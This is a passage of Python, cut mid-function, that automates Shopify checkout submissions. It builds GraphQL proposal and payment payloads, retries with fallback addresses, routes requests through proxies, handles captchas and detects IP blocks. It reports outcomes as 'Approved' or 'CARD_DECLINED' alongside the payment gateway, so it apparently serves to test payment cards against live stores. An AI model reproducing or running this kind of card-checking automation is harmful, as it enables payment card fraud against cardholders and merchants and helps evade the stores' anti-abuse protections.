                        'targetMerchandiseLines': {
                            'lines': [{'stableId': stableId or '1'}]
                        },
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {
                            'value': {'amount': str(shipping_amount), 'currencyCode': currency}
                        },
                        'destinationChanged': False
                    }],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': True,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True
                }

            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken or '',
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': _submit_delivery,
                    'deliveryExpectations': {'deliveryExpectationLines': []},
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stableId or '1',
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                            'expectedTotalPrice': {'any': True},
                            'lineComponentsSource': None,
                            'lineComponents': []
                        }]
                    },
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_identifier,
                                    'sessionId': token,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street, 'address2': address2,
                                            'city': city, 'countryCode': country_code,
                                            'postalCode': s_zip, 'firstName': firstName,
                                            'lastName': lastName, 'zoneCode': state,
                                            'phone': phone
                                        }
                                    },
                                    'cardSource': None
                                }
                            },
                            'amount': {'any': True},
                            'dueAt': None
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street, 'address2': address2,
                                'city': city, 'countryCode': country_code,
                                'postalCode': s_zip, 'firstName': firstName,
                                'lastName': lastName, 'zoneCode': state,
                                'phone': phone
                            }
                        }
                    },
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {'amount': str(tax_amount), 'currencyCode': currency}
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': []
                    },
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': []
                    },
                    'cartMetafields': []
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }
            
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data
            
            submit_json_data = {
                'query': MUTATION_SUBMIT,
                'variables': submit_variables,
                'operationName': 'SubmitForCompletion'
            }

            _delivery_retried = [False]

            async def _addr_fallback_submit(fb_addr):
                """Re-propose delivery with a fallback country address and re-submit."""
                _fcc   = fb_addr["countryCode"]
                _fph   = fb_addr["phone"]
                _fst   = fb_addr["address1"]
                _fci   = fb_addr["city"]
                _fzn   = fb_addr["zoneCode"]
                _fzip  = fb_addr["postalCode"]

                # Step 1: shipping proposal with fallback address
                _fd = {
                    'query': QUERY_PROPOSAL_SHIPPING,
                    'variables': {
                        'sessionInput': {'sessionToken': sst},
                        'queueToken': queueToken or '',
                        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                        'delivery': {
                            'deliveryLines': [{
                                'destination': {
                                    'partialStreetAddress': {
                                        'address1': _fst, 'address2': address2, 'city': _fci,
                                        'countryCode': _fcc, 'postalCode': _fzip,
                                        'firstName': firstName, 'lastName': lastName,
                                        'zoneCode': _fzn, 'phone': _fph
                                    }
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {'any': True},
                                        'shipments': {'any': True}
                                    },
                                    'options': {}
                                },
                                'targetMerchandiseLines': {'any': True},
                                'deliveryMethodTypes': ['SHIPPING'],
                                'expectedTotalPrice': {'any': True},
                                'destinationChanged': True
                            }],
                            'noDeliveryRequired': [],
                            'useProgressiveRates': False,
                            'prefetchShippingRatesStrategy': None,
                            'supportsSplitShipping': True
                        },
                        'deliveryExpectations': {'deliveryExpectationLines': []},
                        'merchandise': {
                            'merchandiseLines': [{
                                'stableId': stableId or '1',
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                        'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                                    }
                                },
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {'any': True},
                                'lineComponentsSource': None, 'lineComponents': []
                            }]
                        },
                        'payment': {
                            'totalAmount': {'any': True}, 'paymentLines': [],
                            'billingAddress': {
                                'streetAddress': {
                                    'address1': '', 'city': '', 'countryCode': _fcc,
                                    'lastName': '', 'zoneCode': _fzn, 'phone': ''
                                }
                            }
                        },
                        'buyerIdentity': {
                            'customer': {'presentmentCurrency': currency, 'countryCode': _fcc},
                            'email': email, 'emailChanged': False, 'phoneCountryCode': _fcc,
                            'marketingConsent': [{'email': {'value': email}}],
                            'shopPayOptInPhone': {'countryCode': _fcc}, 'rememberMe': False
                        },
                        'tip': {'tipLines': []},
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                            'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None,
                            'proposedExemptions': []
                        },
                        'note': {'message': None, 'customAttributes': []},
                        'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None,
                        'scriptFingerprint': {
                            'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [],
                            'paymentScriptChanges': [], 'shippingScriptChanges': []
                        },
                        'optionalDuties': {'buyerRefusesDuties': False}
                    },
                    'operationName': 'Proposal'
                }
                _, _tp1, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, {'operationName': 'Proposal'}, headers, _fd, checkout_url, max_retries=1, proxy=proxy
                )
                _new_strat = delivery_strategy
                _new_ship  = 0.0
                _new_tax   = tax_amount
                try:
                    _jp1 = json.loads(_tp1)
                    _sell1 = _jp1.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
                    _del1 = _sell1.get('delivery', {})
                    if _del1.get('__typename') == 'FilledDeliveryTerms':
                        _avail1 = (_del1.get('deliveryLines') or [{}])[0].get('availableDeliveryStrategies', [])
                        if _avail1:
                            _new_strat = _avail1[0].get('handle', delivery_strategy)
                            try: _new_ship = float(_avail1[0].get('amount', {}).get('value', {}).get('amount', '0'))
                            except: pass
                    _tax1 = _sell1.get('tax', {})
                    if _tax1.get('__typename') == 'FilledTaxTerms':
                        try: _new_tax = float(_tax1.get('totalTaxAmount', {}).get('value', {}).get('amount', '0'))
                        except: pass
                except Exception:
                    pass

                # Step 2: delivery proposal with new address + strategy
                _fd['query'] = QUERY_PROPOSAL_DELIVERY
                _fd['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                    'deliveryStrategyByHandle': {'handle': _new_strat or '', 'customDeliveryRate': False},
                    'options': {}
                }
                _fd['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {
                    'lines': [{'stableId': stableId or '1'}]
                }
                _fd['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {
                    'value': {'amount': str(_new_ship), 'currencyCode': currency}
                }
                _fd['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
                _fd['variables']['payment']['billingAddress'] = {
                    'streetAddress': {
                        'address1': _fst, 'address2': address2, 'city': _fci,
                        'countryCode': _fcc, 'postalCode': _fzip,
                        'firstName': firstName, 'lastName': lastName,
                        'zoneCode': _fzn, 'phone': _fph
                    }
                }
                await make_graphql_request_with_captcha_handling(
                    session, graphql_url, {'operationName': 'Proposal'}, headers, _fd, checkout_url, max_retries=1, proxy=proxy
                )

                # Step 3: rebuild submit with fallback address
                _fb_bill = {
                    'address1': _fst, 'address2': address2, 'city': _fci,
                    'countryCode': _fcc, 'postalCode': _fzip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': _fzn, 'phone': _fph
                }
                _inp = submit_variables['input']
                _fb_sv = {
                    'input': {
                        **_inp,
                        'delivery': {
                            **_inp.get('delivery', {}),
                            'deliveryLines': [{
                                **(_inp.get('delivery', {}).get('deliveryLines') or [{}])[0],
                                'destination': {'streetAddress': _fb_bill},
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyByHandle': {
                                        'handle': _new_strat or '', 'customDeliveryRate': False
                                    },
                                    'options': {'phone': _fph}
                                },
                                'expectedTotalPrice': {
                                    'value': {'amount': str(_new_ship), 'currencyCode': currency}
                                }
                            }]
                        },
                        'payment': {
                            'totalAmount': {'any': True},
                            'paymentLines': [{
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': payment_identifier,
                                        'sessionId': token,
                                        'billingAddress': {'streetAddress': _fb_bill},
                                        'cardSource': None
                                    }
                                },
                                'amount': {'any': True},
                                'dueAt': None
                            }],
                            'billingAddress': {'streetAddress': _fb_bill}
                        },
                        'buyerIdentity': {
                            **_inp.get('buyerIdentity', {}),
                            'customer': {'presentmentCurrency': currency, 'countryCode': _fcc},
                            'phoneCountryCode': _fcc,
                            'shopPayOptInPhone': {'number': _fph, 'countryCode': _fcc}
                        },
                        'taxes': {
                            'proposedAllocations': None,
                            'proposedTotalAmount': {'value': {'amount': str(_new_tax), 'currencyCode': currency}},
                            'proposedTotalIncludedAmount': None,
                            'proposedMixedStateTotalAmount': None,
                            'proposedExemptions': []
                        }
                    },
                    'attemptToken': submit_variables.get('attemptToken'),
                    'metafields': [],
                    'analytics': {'requestUrl': checkout_url}
                }
                _fb_submit = {
                    'query': MUTATION_SUBMIT,
                    'variables': _fb_sv,
                    'operationName': 'SubmitForCompletion'
                }
                _, _fb_txt, _ = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, params, headers, _fb_submit, checkout_url, max_retries=1, proxy=proxy
                )
                # Parse the fallback submit result
                try:
                    _fj = json.loads(_fb_txt)
                    _fsr = _fj.get('data', {}).get('submitForCompletion', {})
                    _ft  = _fsr.get('__typename', '')
                    if _ft in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmitSuccessWithReceipt'):
                        return True, 'Approved', gateway, total_price, currency
                    elif _ft == 'SubmitFailed':
                        for _e in _fsr.get('errors', []):
                            _ec = _e.get('code', '')
                            _ed = _e.get('localizedMessage') or _e.get('message', '')
                            if _ec: return False, _ed or _ec, gateway, total_price, currency
                        return False, 'Submit Failed', gateway, total_price, currency
                    elif _ft == 'SubmitRejected':
                        for _e in _fsr.get('errors', []):
                            _ec = _e.get('code', '')
                            _ed = _e.get('localizedMessage') or _e.get('message', '')
                            _CM = {
                                'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE_FOR_MERCHANDISE_LINE':
                                    'No delivery available (site ships locally only)',
                                'DELIVERY_NO_DELIVERY_STRATEGY_AVAILABLE':
                                    'No delivery available (site ships locally only)',
                                'REQUIRED_ARTIFACTS_UNAVAILABLE': 'Checkout requirements not met',
                            }
                            if _ec in _CM:
                                return False, _CM[_ec], gateway, total_price, currency
                            if _ec: return False, _ec, gateway, total_price, currency
                        return False, 'Submit Rejected', gateway, total_price, currency
                except Exception:
                    pass
                return None  # parse failed — caller uses original error

            response, text, captcha_solved = await make_graphql_request_with_captcha_handling(
                session, graphql_url, params, headers, submit_json_data, checkout_url, max_retries=1, proxy=proxy
            )
            
            if is_captcha_required(text):
                return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency
            
            if "Your order total has changed." in text or '"ORDER_TOTAL_CHANGED"' in text:
                # Shopify recalculated the total. Extract new amount from sellerProposal.
                _new_total = None
                try:
                    _tj = json.loads(text)
                    _sr = _tj.get('data', {}).get('submitForCompletion', {})
                    # Primary: sellerProposal.runningTotal / totalAmount
                    _seller = _sr.get('sellerProposal', {})
                    for _k in ('runningTotal', 'totalAmount', 'total'):
                        _v = _seller.get(_k, {})
                        if isinstance(_v, dict): _v = _v.get('value', _v)
                        if isinstance(_v, dict): _v = _v.get('amount')
                        if _v and str(_v).replace('.', '', 1).isdigit():
                            _new_total = str(_v); break
                    # Fallback: search errors array sellerProposal
                    if not _new_total:
                        for _err in _tj.get('errors', []):
                            _seller2 = _err.get('sellerProposal', {})
                            for _k in ('runningTotal', 'totalAmount', 'total'):
                                _v = _seller2.get(_k, {})
                                if isinstance(_v, dict): _v = _v.get('value', _v)
                                if isinstance(_v, dict): _v = _v.get('amount')
                                if _v and str(_v).replace('.', '', 1).isdigit():
                                    _new_total = str(_v); break
                            if _new_total: break
                    # Regex fallback: look for runningTotal/totalAmount amount specifically
                    if not _new_total:
                        _m1 = re.search(r'"(?:runningTotal|totalAmount)"[^}]{0,200}?"amount"\s*:\s*"([0-9]+\.[0-9]+)"', text)
                        if _m1: _new_total = _m1.group(1)
                except Exception:
                    pass

                if _new_total:
                    # _new_total is the new merchandise running total from sellerProposal.
                    # Also try to extract updated tax from the response.
                    _new_tax = tax_amount
                    try:
                        _tj2 = json.loads(text) if not isinstance(text, dict) else text
                        _sr2 = _tj2.get('data', {}).get('submitForCompletion', {})
                        _sel2 = _sr2.get('sellerProposal', {})
                        _tax2 = _sel2.get('tax', {})
                        if _tax2 and _tax2.get('__typename') == 'FilledTaxTerms':
                            _ta2 = _tax2.get('totalTaxAmount', {}).get('value', {}).get('amount', None)
                            if _ta2 is not None:
                                _new_tax = float(_ta2)
                    except Exception:
                        pass
                    # Full order total = new merchandise total + shipping + updated tax
                    _new_full = str(round(float(_new_total) + shipping_amount + _new_tax, 2))
                    running_total = _new_total
                    tax_amount    = _new_tax
                    total_price   = _new_full
                    try:
                        submit_variables['input']['taxes']['proposedTotalAmount']['value']['amount'] = str(_new_tax)
                        submit_json_data['variables'] = submit_variables
                        response, text, _ = await make_graphql_request_with_captcha_handling(
                            session, graphql_url, params, headers, submit_json_data,
                            checkout_url, max_retries=1, proxy=proxy
                        )
                    except Exception:
                        return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency
                    if "Your order total has changed." in text or '"ORDER_TOTAL_CHANGED"' in text:
                        return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency
                else:
                    return False, "ORDER_TOTAL_CHANGED", gateway, total_price, currency

            if "The requested payment method is not available." in text:
                return False, "Payment method not available", gateway, total_price, currency
            
            if not text or not text.strip():
                return False, "Empty response from site (Submit step)", gateway, total_price, currency
            _ts = text.strip()
            if _ts.lower().startswith(('<!doctype', '<html', '<?xml')):
                return False, "Site returned HTML block page (rate-limited or IP blocked)", gateway, total_price, currency
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                
                if not submit_data:
                    errors = resp_json.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code')
                            if code:
                                return False, code, gateway, total_price, currency
                    return False, "Empty submit response", gateway, total_price, currency
                
                result_type = submit_data.get('__typename', '')
                
                if result_type in ['SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted']:
                    receipt = submit_data.get('receipt', {})
                    if receipt:
                        receipt_type = receipt.get('__typename', '')
                        
                        if receipt_type == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        
                        rid = receipt.get('id')
                    else:
                        return False, "SubmitSuccess but no receipt", gateway, total_price, currency
                
                elif result_type == 'SubmitFailed':
                    reason = submit_data.get('reason', 'Unknown reason')
                    _reason_lower = str(reason).lower()
                    # SubmitFailed can also carry delivery-changed errors — retry if so
                    _is_delivery_failed = (
                        'delivery details may have changed' in _reason_lower
                        or 'verify your shipping' in _reason_lower
                        or 'shipping method' in _reason_lower
                        or 'delivery_line_detail' in _reason_lower
                        or 'delivery_delivery_line_detail' in _reason_lower
                    )
                    if _is_delivery_failed:
                        _ok3, _msg3, _tp3 = await _reprop_and_submit()
                        if _ok3:
                            return True, _msg3, gateway, _tp3, currency
                        return False, _msg3, gateway, _tp3, currency
                    return False, extract_clean_response(reason), gateway, total_price, currency
                
                elif result_type == 'SubmitRejected':
                    errors = submit_data.get('errors', [])
                    if errors:
                        for error in errors:
                            code = error.get('code', '')
                            # Handle DELIVERY_DELIVERY_LINE_DETAIL_CHANGED: re-propose delivery then re-submit
                            _loc_msg_lower = (error.get('localizedMessage', '') + ' ' + error.get('nonLocalizedMessage', '')).lower()
                            _is_delivery_changed = (
                                code in ('DELIVERY_DELIVERY_LINE_DETAIL_CHANGED', 'DELIVERY_LINE_DETAIL_CHANGED',
                                         'DELIVERY_DELIVERY_LINE_DETAILS_CHANGED')
                                or 'delivery details may have changed' in _loc_msg_lower
                                or 'verify your shipping' in _loc_msg_lower
                                or 'shipping method' in _loc_msg_lower
                                or 'delivery_line_detail' in code.lower()
                            )
                            if _is_delivery_changed:
                                async def _reprop_and_submit():
                                    # Digital path: re-propose with noDeliveryRequired then re-submit
                                    if not _requires_shipping:
                                        _dfd = {
                                            'query': QUERY_PROPOSAL_SHIPPING,
                                            'variables': {
                                                'sessionInput': {'sessionToken': sst},
                                                'queueToken': queueToken or '',
                                                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                                                'delivery': {
                                                    'deliveryLines': [{
                                                        'selectedDeliveryStrategy': {
                                                            'deliveryStrategyMatchingConditions': {
                                                                'estimatedTimeInTransit': {'any': True},
                                                                'shipments': {'any': True}
                                                            },
                                                            'options': {}
                                                        },
                                                        'targetMerchandiseLines': {'any': True},
                                                        'deliveryMethodTypes': ['NONE'],
                                                        'expectedTotalPrice': {'any': True},
                                                        'destinationChanged': True
                                                    }],
                                                    'noDeliveryRequired': [],
                                                    'useProgressiveRates': False,
                                                    'prefetchShippingRatesStrategy': None,
                                                    'supportsSplitShipping': True
                                                },
                                                'deliveryExpectations': {'deliveryExpectationLines': []},
                                                'merchandise': json_data['variables']['merchandise'],
                                                'payment': {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': {'address1': '', 'city': '', 'countryCode': country_code, 'lastName': '', 'zoneCode': state, 'phone': ''}}},
                                                'buyerIdentity': json_data['variables']['buyerIdentity'],
                                                'tip': {'tipLines': []},
                                                'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                                                'note': {'message': None, 'customAttributes': []},
                                                'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None,
                                                'scriptFingerprint': {'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []},
                                                'optionalDuties': {'buyerRefusesDuties': False},
                                                'transformerFingerprintV2': transformer_fingerprint_v2
                                            },
                                            'operationName': 'Proposal'
                                        }
                                        _, _dt, _ = await make_graphql_request_with_captcha_handling(
                                            session, graphql_url, {'operationName': 'Proposal'}, headers, _dfd, checkout_url, max_retries=1, proxy=proxy
                                        )
                                        _new_qt = queueToken
                                        try:
                                            _dj = json.loads(_dt)
                                            _dr = (((_dj.get('data') or {}).get('session') or {}).get('negotiate') or {}).get('result') or {}
                                            _new_qt = _dr.get('queueToken') or queueToken
                                        except Exception:
                                            pass
                                        _dsv = {
                                            'input': {
                                                **submit_variables['input'],
                                                'queueToken': _new_qt or '',
                                                'delivery': {
                                                    'deliveryLines': [{
                                                        'selectedDeliveryStrategy': {
                                                            'deliveryStrategyMatchingConditions': {
                                                                'estimatedTimeInTransit': {'any': True},
                                                                'shipments': {'any': True}
                                                            },
                                                            'options': {}
                                                        },
                                                        'targetMerchandiseLines': {
                                                            'lines': [{'stableId': stableId or '1'}]
                                                        },
                                                        'deliveryMethodTypes': ['NONE'],
                                                        'expectedTotalPrice': {'any': True},
                                                        'destinationChanged': True
                                                    }],
                                                    'noDeliveryRequired': [],
                                                    'useProgressiveRates': False,
                                                    'prefetchShippingRatesStrategy': None,
                                                    'supportsSplitShipping': True
                                                },
                                            },
                                            'attemptToken': f"{attempt_token}-d{random.randint(1000,9999)}",
                                            'metafields': [],
                                            'analytics': {'requestUrl': checkout_url}
                                        }
                                        _dsd = {'query': MUTATION_SUBMIT, 'variables': _dsv, 'operationName': 'SubmitForCompletion'}
                                        _, _dst, _ = await make_graphql_request_with_captcha_handling(
                                            session, graphql_url, {'operationName': 'SubmitForCompletion'}, headers, _dsd, checkout_url, max_retries=1, proxy=proxy
                                        )
                                        try:
                                            _djr = json.loads(_dst)
                                            _dsr = _djr.get('data', {}).get('submitForCompletion', {})
                                            _drt = _dsr.get('__typename', '')
                                            if _drt in ('SubmitSuccess', 'SubmittedForCompletion', 'SubmitAlreadyAccepted'):
                                                return True, 'ORDER_PLACED', total_price
                                            elif _drt == 'SubmitFailed':
                                                _dfr = _dsr.get('reason', 'DECLINED')
                                                return False, extract_clean_response(str(_dfr)), total_price
                                            elif _drt == 'SubmitRejected':
                                                _de = (_dsr.get('errors') or [{}])[0]
                                                _dc = _de.get('code', '')
                                                _dm = _de.get('localizedMessage') or _de.get('nonLocalizedMessage') or _dc or 'DECLINED'
                                                return False, extract_clean_response(_dm), total_price
                                        except Exception:
                                            pass
                                        return False, 'CARD_DECLINED', total_price
                                    # Physical path: re-run shipping proposal (any strategy) to get fresh handle
                                    _fp1 = {'operationName': 'Proposal'}
                                    _fd1 = {
                                        'query': QUERY_PROPOSAL_SHIPPING,
                                        'variables': {
                                            'sessionInput': {'sessionToken': sst},
                                            'queueToken': queueToken or '',
                                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                                            'delivery': {
                                                'deliveryLines': [{
                                                    'destination': {
                                                        'partialStreetAddress': {
                                                            'address1': street, 'address2': address2, 'city': city,
                                                            'countryCode': country_code, 'postalCode': s_zip,
                                                            'firstName': firstName, 'lastName': lastName,
                                                            'zoneCode': state, 'phone': phone
                                                        }
                                                    },
                                                    'selectedDeliveryStrategy': {
                                                        'deliveryStrategyMatchingConditions': {
                                                            'estimatedTimeInTransit': {'any': True},
                                                            'shipments': {'any': True}
                                                        },
                                                        'options': {}
                                                    },
                                                    'targetMerchandiseLines': {'any': True},
                                                    'deliveryMethodTypes': ['SHIPPING'],
                                                    'expectedTotalPrice': {'any': True},
                                                    'destinationChanged': False
                                                }],
                                                'noDeliveryRequired': [],
                                                'useProgressiveRates': False,
                                                'prefetchShippingRatesStrategy': None,
                                                'supportsSplitShipping': True
                                            },
                                            'deliveryExpectations': {'deliveryExpectationLines': []},
                                            'merchandise': {
                                                'merchandiseLines': [{
                                                    'stableId': stableId or '1',
                                                    'merchandise': {
                                                        'productVariantReference': {
                                                            'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                                                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                                            'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None
                                                        }
                                                    },
                                                    'quantity': {'items': {'value': 1}},
                                                    'expectedTotalPrice': {'any': True},
                                                    'lineComponentsSource': None, 'lineComponents': []
                                                }]
                                            },
                                            'payment': {
                                                'totalAmount': {'any': True}, 'paymentLines': [],
                                                'billingAddress': {'streetAddress': {'address1': '', 'city': '', 'countryCode': country_code, 'lastName': '', 'zoneCode': 'ENG', 'phone': ''}}
                                            },
                                            'buyerIdentity': {
                                                'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                                                'email': email, 'emailChanged': False, 'phoneCountryCode': country_code,
                                                'marketingConsent': [{'email': {'value': email}}],
                                                'shopPayOptInPhone': {'countryCode': country_code}, 'rememberMe': False
                                            },
                                            'tip': {'tipLines': []},
                                            'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                                            'note': {'message': None, 'customAttributes': []},
                                            'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None,
                                            'scriptFingerprint': {'signature': None, 'signatureUuid': None, 'lineItemScriptChanges': [], 'paymentScriptChanges': [], 'shippingScriptChanges': []},
                                            'optionalDuties': {'buyerRefusesDuties': False}
                                        },
                                        'operationName': 'Proposal'
                                    }
                                    _, _tp1, _ = await make_graphql_request_with_captcha_handling(
                                        session, graphql_url, _fp1, headers, _fd1, checkout_url, max_retries=1, proxy=proxy
                                    )
                                    # Parse fresh delivery strategy
                                    _new_strat = delivery_strategy
                                    _new_ship = shipping_amount
                                    _new_tax = tax_amount
                                    _new_run = running_total
                                    try:
                                        _jp1 = json.loads(_tp1)
                                        _sell1 = _jp1.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
                                        _del1 = _sell1.get('delivery', {})
                                        if _del1.get('__typename') == 'FilledDeliveryTerms':
                                            _avail1 = (_del1.get('deliveryLines') or [{}])[0].get('availableDeliveryStrategies', [])
                                            if _avail1:
                                                _new_strat = _avail1[0].get('handle', delivery_strategy)
                                                try: _new_ship = float(_avail1[0].get('amount', {}).get('value', {}).get('amount', '0'))
                                                except: pass
                                        _tax1 = _sell1.get('tax', {})
                                        if _tax1.get('__typename') == 'FilledTaxTerms':
                                            try: _new_tax = float(_tax1.get('totalTaxAmount', {}).get('value', {}).get('amount', '0'))
                                            except: pass
                                        _rt1 = _sell1.get('runningTotal', {})
                                        if isinstance(_rt1, dict):
                                            _rta1 = _rt1.get('value', {}).get('amount')
                                            if _rta1: _new_run = _rta1
                                    except Exception:
                                        pass
                                    # Step 2: re-run delivery proposal with fresh strategy
                                    json_data['query'] = QUERY_PROPOSAL_DELIVERY
                                    json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                                        'deliveryStrategyByHandle': {'handle': _new_strat or '', 'customDeliveryRate': False},
                                        'options': {}
                                    }
                                    json_data['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines'] = {'lines': [{'stableId': stableId or '1'}]}
                                    json_data['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice'] = {'value': {'amount': str(_new_ship), 'currencyCode': currency}}
                                    json_data['variables']['delivery']['deliveryLines'][0]['destinationChanged'] = False
                                    json_data['variables']['payment']['billingAddress'] = {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}
                                    json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(_new_tax)
                                    json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
                                    await make_graphql_request_with_captcha_handling(
                                        session, graphql_url, {'operationName': 'Proposal'}, headers, json_data, checkout_url, max_retries=1, proxy=proxy
                                    )
                                    # Step 3: fresh submit with new delivery
                                    _new_tp = str(round(float(_new_run) + _new_ship + _new_tax, 2)) if _new_run else total_price
                                    _nsv = {
                                        'input': {
                                            'sessionInput': {'sessionToken': sst},
                                            'queueToken': queueToken or '',
                                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                                            'delivery': {
                                                'deliveryLines': [{
                                                    'destination': {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}},
                                                    'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': _new_strat or '', 'customDeliveryRate': False}, 'options': {'phone': phone}},
                                                    'targetMerchandiseLines': {'lines': [{'stableId': stableId or '1'}]},
                                                    'deliveryMethodTypes': ['SHIPPING'],
                                                    'expectedTotalPrice': {'value': {'amount': str(_new_ship), 'currencyCode': currency}},
                                                    'destinationChanged': False
                                                }],
                                                'noDeliveryRequired': [], 'useProgressiveRates': True,
                                                'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
                                            },
                                            'merchandise': submit_variables['input']['merchandise'],
                                            'payment': {
                                                'totalAmount': {'any': True},
                                                'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_identifier, 'sessionId': token, 'billingAddress': {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}, 'cardSource': None}}, 'amount': {'any': True}, 'dueAt': None}],
                                                'billingAddress': {'streetAddress': {'address1': street, 'address2': address2, 'city': city, 'countryCode': country_code, 'postalCode': s_zip, 'firstName': firstName, 'lastName': lastName, 'zoneCode': state, 'phone': phone}}
                                            },
                                            'buyerIdentity': submit_variables['input']['buyerIdentity'],
                                            'taxes': {'proposedAllocations': None, 'proposedTotalAmount': {'value': {'amount': str(_new_tax), 'currencyCode': currency}}, 'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                                            'tip': {'tipLines': []}, 'note': {'message': None, 'customAttributes': []},
                                            'localizationExtension': {'fields': []}, 'nonNegotiableTerms': None,
                                            'optionalDuties': {'buyerRefusesDuties': False}
                                        },
                                        'attemptToken': attempt_token, 'metafields': [],
                                        'analytics': {'requestUrl': checkout_url}
                                    }
                                    _nsd = {'query': MUTATION_SUBMIT, 'variables': _nsv, 'operationName': 'SubmitForCompletion'}
